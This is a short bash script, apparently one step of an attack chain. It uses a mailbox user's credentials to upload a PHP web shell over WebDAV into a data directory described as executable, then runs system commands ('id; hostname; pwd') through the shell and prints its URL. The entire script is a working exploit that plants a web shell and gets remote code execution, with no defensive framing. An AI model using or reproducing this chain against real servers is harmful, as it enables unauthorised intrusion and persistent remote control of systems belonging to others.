#!/bin/bash
# WebDAV PUT PHP as the mailbox user → grofiles RCE (data dir is executable).
set -euo pipefail
. "$(dirname "$0")/00-env.sh"

echo "[*] PUT $DAV/s.php"
curl -sk -o /dev/null -w 'HTTP %{http_code}\n' -X PUT "$DAV/s.php" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @"$SCRIPTS/lib/s.php"

echo "[*] exec id"
curl -skG --max-time 15 --data-urlencode 'c=id; hostname; pwd' "$WS"
echo
echo "[+] webshell: $WS?c=id"
